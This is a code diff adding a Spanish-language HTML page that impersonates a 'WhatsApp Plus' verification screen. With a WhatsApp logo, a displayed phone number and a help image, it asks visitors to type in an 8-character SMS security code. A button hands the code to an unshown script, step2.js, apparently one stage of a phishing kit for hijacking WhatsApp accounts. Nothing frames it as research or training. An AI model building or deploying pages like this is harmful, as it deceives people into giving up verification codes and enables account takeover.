@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <title>Whatsapp Plus Verificacion</title>
+    <link rel="stylesheet" href="./css/style.css">
+</head>
+
+<body>
+    <header>
+        <nav>
+            <img src="./img/logo.png" alt="Logo whatsapp">
+        </nav>
+    </header>
+    <div class="all-container">
+        <div class="container-texto">
+            <h1>Ingresa el codigo de seguridad</h1>
+            <hr>
+            <p>Comprueba si recibiste en el telefono un mensaje de texto con un código de 8 caracteres</p>
+            <div class="container-formulario">
+                <input type="text" id="codigoInput" placeholder="Ingresa el codigo">
+                <p>Enviamos el codigo a +<span id="numero-telefono"></span></p>
+            </div>
+            <button onclick="enviarMensaje()">Continuar</button>
+            <div id="contenido">
+                <p id="parrafo" class="error-code" onclick="mostrarImagen()">No recibiste el código?</p>
+            </div>
+        
+            <div id="imagenEmergente" onclick="cerrarImagen()">
+                <img src="./img/guia.png" alt="Imagen Emergente">
+            </div>
+        </div>
+    </div>
+    <div class="container-footer">
+        <img class="footer" src="./img/footer.png" alt="Footer">
+    </div>
+    <script src="./js/step2.js"></script>
+</body>
+
+</html>
